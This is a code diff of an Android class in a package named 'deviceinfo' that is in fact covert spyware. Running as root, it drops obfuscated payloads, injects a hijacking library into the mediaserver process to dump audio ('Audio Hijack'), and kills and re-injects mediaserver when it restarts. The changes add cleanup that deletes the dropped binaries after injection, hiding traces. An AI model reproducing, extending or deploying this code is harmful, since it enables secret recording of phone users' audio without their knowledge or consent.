@@ -11,6 +11,8 @@ import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.Configuration;
+import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.file.AutoFile;
 import com.android.m.M;
 
 public class Instrument {
@@ -37,7 +39,18 @@ public class Instrument {
 		pidCompletePath = path + "/" + pidFile;
 	}
 
-	public boolean installHijacker() {
+	private boolean deleteHijacker() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (installHijacker) delete lib");
+		}
+		AutoFile file = new AutoFile(Status.getAppContext().getFilesDir(), lib);
+		file.delete();
+		file = new AutoFile(Status.getAppContext().getFilesDir(), hijacker);
+		file.delete();
+		return true;
+	}
+
+	private boolean installHijacker() {
 		InputStream stream = Utils.getAssetStream(M.e("i.bin")); // libt.so
 
 		try {
@@ -45,10 +58,10 @@ public class Instrument {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(installHijacker): Nope, we are not root");
 				}
-				
+
 				return false;
 			}
-			
+
 			// Install library
 			Root.fileWrite(lib, stream, Cfg.RNDDB);
 			Execute.execute(Configuration.shellFile + " " + M.e("pzm 666 ") + path + "/" + lib);
@@ -63,8 +76,7 @@ public class Instrument {
 			stream = Utils.getAssetStream(M.e("m.bin")); // Hijacker
 
 			Root.fileWrite(hijacker, stream, Cfg.RNDDB);
-			Runtime.getRuntime()
-					.exec(Configuration.shellFile + " " + M.e("pzm 750 ") + path + "/" + hijacker);
+			Runtime.getRuntime().exec(Configuration.shellFile + " " + M.e("pzm 750 ") + path + "/" + hijacker);
 
 			stream.close();
 		} catch (Exception e) {
@@ -75,101 +87,122 @@ public class Instrument {
 			return false;
 		}
 
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (installHijacker) delete lib");
-		}
-		//File file = new File(Status.getAppContext().getFilesDir(), lib);
-		//file.delete();
+		
+		// File file = new File(Status.getAppContext().getFilesDir(), lib);
+		// file.delete();
 
 		return true;
 	}
 
-	public void startInstrumentation() {
+	public boolean startInstrumentation() {
 		if (Root.isRootShellInstalled() == false) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(startInstrumentation): Nope, we are not root");
 			}
-			
-			return;
+
+			return false;
+		}
+
+		if (!installHijacker()) {
+			return false;
+		}
+
+		try {
+			int pid = getProcessPid();
+
+			if (pid > 0) {
+				// Run the injector
+				String scriptName = "ij";
+				String script = M.e("#!/system/bin/sh") + "\n";
+				script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + "\n";
+
+				Root.createScript(scriptName, script);
+				ExecuteResult ret = Execute.executeRoot(path + "/" + scriptName);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (startInstrumentation): " + ret.getStdout() + " err: " + ret.getStdErr());
+				}
+
+				Root.removeScript(scriptName);
+
+				Utils.sleep(2000);
+				int newpid = getProcessPid();
+				if (newpid != pid) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (startInstrumentation) Error: mediaserver was killed");
+					}
+				}
+
+				File d = new File(dumpPath);
+
+				boolean started = false;
+
+				for (int i = 0; i < 5 && !started; i++) {
+					File[] files = d.listFiles();
+					for (File file : files) {
+						if (file.getName().endsWith(M.e(".cnf"))) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (startInstrumentation) got file: " + file.getName());
+							}
+							started = true;
+							file.delete();
+						}
+
+					}
+					if (!started) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (startInstrumentation) sleep 5 secs");
+						}
+						Utils.sleep(2000);
+					}
+				}
+
+				if (!started && killed < MAX_KILLED) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (startInstrumentation) Kill mediaserver");
+					}
+					killProc();
+					killed += 1;
+				}
+				
+				if (started && Cfg.DEBUG) {
+					Check.log(TAG + " (startInstrumentation) Audio Hijack installed");
+					EvidenceReference.info("Audio Hijack");
+				}
+
+				stopMonitor = false;
+
+				if (pidMonitor == null) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (startInstrumentation) script: \n" + script);
+						Check.log(TAG + "(startInstrumentation): Starting MeadiaserverMonitor thread");
+					}
+
+					pidMonitor = new MediaserverMonitor(pid);
+					monitor = new Thread(pidMonitor);
+					monitor.start();
+				}else{
+					pidMonitor.setPid(pid);
+				}
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + "(getProcessPid): unable to get pid");
+				}
+			}
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (startInstrumentation) Error: " + e);
+			}
+			return false;
+		} finally {
+			deleteHijacker();
 		}
 		
-		int pid = getProcessPid();
-
-		if (pid > 0) {
-			// Run the injector
-			String scriptName = "ij";
-			String script = M.e("#!/system/bin/sh") + "\n";
-			script += path + "/" + hijacker + " -p " + pid + " -l " + path + "/" + lib + " -f " + dumpPath + "\n";
-
-			Root.createScript(scriptName, script);
-			ExecuteResult ret = Execute.executeRoot(path + "/" + scriptName);
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (startInstrumentation): " + ret.getStdout() + " err: " + ret.getStdErr());
-			}
-			
-			Root.removeScript(scriptName);
-
-			Utils.sleep(2000);
-			int newpid = getProcessPid();
-			if (newpid != pid) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (startInstrumentation) Error: mediaserver was killed");
-				}
-			}
-			
-			File d = new File(dumpPath);
-			
-			boolean started = false;
-			
-			for(int i = 0; i<5 && !started; i++){
-				File[] files = d.listFiles();
-				for (File file : files) {
-					if(file.getName().endsWith(M.e(".cnf"))){
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (startInstrumentation) got file: " + file.getName());
-						}
-						started = true;
-						file.delete();
-					}
-					
-				}
-				if(!started){
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (startInstrumentation) sleep 5 secs");
-					}
-					Utils.sleep(2000);
-				}
-			}
- 
-			if(!started && killed < MAX_KILLED){
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (startInstrumentation) Kill mediaserver");
-				}
-				killProc();
-				killed +=1;
-			}
-				
-			stopMonitor = false;
-
-			if (pidMonitor == null) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (startInstrumentation) script: \n" + script);
-					Check.log(TAG + "(startInstrumentation): Starting MeadiaserverMonitor thread");
-				}
-				
-				pidMonitor = new MediaserverMonitor(pid);
-				monitor = new Thread(pidMonitor);
-				monitor.start();
-			}
-		} else {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + "(getProcessPid): unable to get pid");
-			}
-		}
+		return true;
 	}
 
 	public void stopInstrumentation() {
 		stopMonitor = true;
+		monitor = null;
 	}
 
 	private int getProcessPid() {
@@ -202,11 +235,11 @@ public class Instrument {
 
 		return pid;
 	}
-	
+
 	public void killProc() {
 		try {
 			int pid = getProcessPid();
-			android.os.Process.killProcess(pid);
+			Execute.executeRoot("kill " + pid);
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (killProc) Error: " + ex);
@@ -216,39 +249,46 @@ public class Instrument {
 
 	class MediaserverMonitor implements Runnable {
 		private int cur_pid, start_pid;
+		
+		public void setPid(int pid){
+			start_pid = pid;
+		}
 
-		public MediaserverMonitor(int p) {
+		public MediaserverMonitor(int pid) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + "(MediaserverMonitor): starting");
+				Check.log(TAG + "(MediaserverMonitor): starting with pid " + pid);
 			}
 
-			start_pid = p;
+			setPid(pid);
 		}
 
 		@Override
 		public void run() {
 			while (true) {
 				Utils.sleep(10000);
-	
+
 				if (stopMonitor) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(MediaserverMonitor run): closing monitor thread");
 					}
-	
+
 					stopMonitor = false;
 					return;
 				}
-	
+
 				cur_pid = getProcessPid();
-	
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (MediaserverMonitor run) pid: " + cur_pid);
+				}
+
 				// Mediaserver died
 				if (cur_pid != start_pid) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + "(MediaserverMonitor run): Mediaserver died, restarting instrumentation");
 					}
-	
+					
 					startInstrumentation();
-					start_pid = getProcessPid();
+					//start_pid = getProcessPid();
 				}
 			}
 		}
